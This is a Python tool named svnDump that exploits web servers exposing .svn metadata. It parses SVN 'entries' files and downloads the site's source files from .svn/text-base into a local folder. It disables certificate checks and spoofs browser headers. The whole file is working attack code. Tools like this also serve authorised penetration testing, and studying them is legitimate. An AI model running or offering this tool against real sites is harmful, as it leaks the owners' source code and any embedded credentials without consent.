# -*- coding=utf-8 -*-

import requests
import os, re, sys, optparse
from prettytable import PrettyTable
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

timeout = 5
header={
  'accept':'text/html,application/xhtml+xml,application/xml',
  'user-agent':'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Mobile Safari/537.36',
  'referer':'http://baidu.com'
}

def svnVersionMoreThan17(url):
  # if SVN version > 1.7 return True, else return false
  url = url + 'entries'
  try:
    res = requests.get(url, headers=header, timeout=timeout, verify=False)
    isMoreThan17 = res.text.startswith('12\n')
    print(f'SVN version' + ('>' if isMoreThan17 else '<' + '1.7'), flush=True)
    return isMoreThan17
  except:
    print(f'Get svn version Error!\n', flush=True)
    sys.exit()

class SvnLessThan1_7:
  def __init__(self, url):
    self.url = url
    self.file_list = []
    self.dir_list = []
    self.flag = False

  # 解析 entries
  def entries(self, url: str, dir: str):
    url = url.encode('utf-8').decode('utf-8')
    try:
      print(f'Analyze: {url}', flush=True)
    except: pass
    try:
      res = requests.get(url, headers=header, timeout=timeout, verify=False)
      list = res.text.split('\n')
      i = 0
      for data in list:
        if data == "file":
          if list[i-1]:
            if dir:
              self.file_list.append(dir + '/' + list[i-1])
            else:
              self.file_list.append(list[i - 1])
        elif data == "dir":
          if list[i-1]:
            if dir:
              self.dir_list.append(dir + '/' + list[i-1])
            else:
              self.dir_list.append(list[i-1])
            self.flag = True
        i = i+1
    except:
      pass
  
  # 循环解析 entries
  def forloop(self):
    for dir in self.dir_list:
      url = f'{os.path.dirname(os.path.dirname(self.url))}/{dir}/.svn/entries'
      self.entries(url, dir)

  # print file
  def print_file(self):
    self.entries(self.url + 'entries', '')
    if self.flag: self.forloop()
    table = PrettyTable(['File Name', 'File Type', 'URL'])
    for name in self.file_list:
      table.add_row([
        name,
        'file',
        f'{os.path.dirname(name)}/.svn/text-base/{os.path.basename(name)}.svn-base'
      ])
    table.sort_key("URL")
    table.reversesort = True
    try:
      print(table)
    except: pass

  def dumpFile(self):
    if (not os.path.exists('dbs')): os.makedirs('dbs')
    # 匹配 url 中的 host，然后作为文件夹名
    pattern = re.compile(r'(?:\w+\.+)+(?:\w+)')
    host = pattern.findall(self.url)
    # 判断 host 这个目录是否存在，如果存在的话就创建 host(i) i 递增
    if (not os.path.exists(f'dbs/{host[0]}')):
      path = f'dbs/{host[0]}'
      os.makedirs(path)
    else:
      i = 1
      while os.path.exists(f'dbs/{host[0]}({i})'):
        i = i + 1
      path = f'dbs/{host[0]}({i})'
      os.makedirs(path)
    self.entries(f'{self.url}entries', '')
    self.forloop()

    for dir in self.dir_list:
      if not os.path.exists(f'{path}/{dir}'): os.makedirs(f'{path}/{dir}')

    table = PrettyTable(['FileName', 'URL', 'Download State'])
    for file in self.file_list:
      if os.path.dirname(file):
        file_url = f'{os.path.dirname(os.path.dirname(self.url))}/{os.path.dirname(file)}/.svn/text-base/{os.path.basename(file)}.svn-base'
      else:
        file_url = f'{os.path.dirname(os.path.dirname(self.url))}{os.path.dirname(file)}/.svn/text-base/{os.path.basename(file)}.svn-base'
      try:
        res = requests.get(file_url, headers=header, timeout=timeout, verify=False)
        with open(f'{path}/{file}', 'wb') as f:
          f.write(res.content)
          table.add_row([
            file, 
            f'{os.path.dirname(file)}/.svn/text-base/{os.path.basename(file)}.svn-base', 
            'OK'
          ])
      except:
        pass
    table.sort_key('URL')
    table.reversesort=True
    try:
      print(table)
    except: pass


if __name__ == '__main__':
  """
  命令行参数：
    python3 svnDump.py -u TargetURL [--thread 5]
  """
  print("""\n
  _____            _____                        
 / ____|          |  __ \                       
| (_____   ___ __ | |  | |_   _ _ __ ___  _ __  
 \___ \ \ / / '_ \| |  | | | | | '_ ` _ \| '_ \ 
 ____) \ V /| | | | |__| | |_| | | | | | | |_) |
|_____/ \_/ |_| |_|_____/ \__,_|_| |_| |_| .__/ 
                                         | |    
                                         |_|    
\n""", flush=True)
  
  opt = optparse.OptionParser()
  opt.add_option("-u", "--url", action="store", dest="url", help="TargetURL e.g.http://url/.svn")
  opt.add_option("--thread", action="store", dest="thread_num", type="int", default=5, help="The thread num default is 5")
  (options, args) = opt.parse_args()
  if not options.url or not isinstance(options.url, str):
    print("[-] URL Error!", flush=True)
    sys.exit()
  url = options.url
  # 判断 url 后面是否有 / 如果没有就加上
  re_ = re.compile(r'[\w\.\/\:]+/$')
  if not re_.search(url):
    url = url + "/"

  if svnVersionMoreThan17(url):
    raise Exception('Not Support svn>1.7, you can search dumpall in github')
  else:
    svn = SvnLessThan1_7(url)
    svn.dumpFile()
